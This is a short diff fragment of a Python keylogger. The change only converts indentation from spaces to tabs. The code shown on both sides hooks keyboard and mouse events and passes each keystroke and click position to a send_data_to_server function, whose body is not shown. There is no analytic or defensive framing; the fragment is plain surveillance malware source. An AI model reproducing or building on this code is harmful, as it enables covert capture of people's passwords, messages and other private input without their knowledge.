@@ -9,15 +9,15 @@ def send_data_to_server(data):
     
 # Function to log keystrokes
 def log_keystroke(key):
-    try:
-        send_data_to_server(key.char)
-    except AttributeError:
-        send_data_to_server(str(key))
+	try:
+		send_data_to_server(key.char)
+	except AttributeError:
+		send_data_to_server(str(key))
 
 # Function to log mouse clicks
 def log_mouse_click(x, y, button, pressed):
-    if pressed:
-        send_data_to_server('Mouse click at ({}, {})'.format(x, y))
+	if pressed:
+		send_data_to_server('Mouse click at ({}, {})'.format(x, y))
 
 # Hook the keyboard event
 keyboard_listener = keyboard.Listener(on_press=log_keystroke)
